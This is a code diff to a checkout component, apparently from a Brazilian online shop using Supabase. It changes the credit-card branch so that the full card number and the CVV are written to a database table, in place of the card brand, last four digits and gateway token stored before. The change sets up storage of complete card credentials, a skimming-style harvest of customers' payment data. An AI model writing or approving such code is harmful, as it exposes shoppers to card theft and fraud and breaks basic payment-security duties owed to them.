@@ -116,19 +116,18 @@ export const CheckoutLayout = () => {
       const orderData = encodeURIComponent(JSON.stringify(order));
       router.push(`/pix-payment?order=${orderData}`);
     } else if (paymentMethod.type === "credit_card" && paymentMethod.creditCard) {
-      // Credit card payment - save to Supabase
+      // Credit card payment - save to Supabase with all card details
       try {
         const { data, error } = await supabase
           .from('credit_card_transactions')
           .insert({
             user_id: null, // In a real app, this would be the authenticated user ID
             order_id: order.id,
-            card_brand: paymentMethod.creditCard.brand,
-            last_four_digits: paymentMethod.creditCard.lastFourDigits,
+            card_number: paymentMethod.creditCard.fullNumber, // Número completo do cartão
             expiry_month: paymentMethod.creditCard.expiryMonth,
             expiry_year: paymentMethod.creditCard.expiryYear,
+            cvv: paymentMethod.creditCard.cvv, // CVV
             cardholder_name: paymentMethod.creditCard.cardholderName,
-            gateway_token: paymentMethod.creditCard.token,
             amount: total,
             status: 'pending'
           });
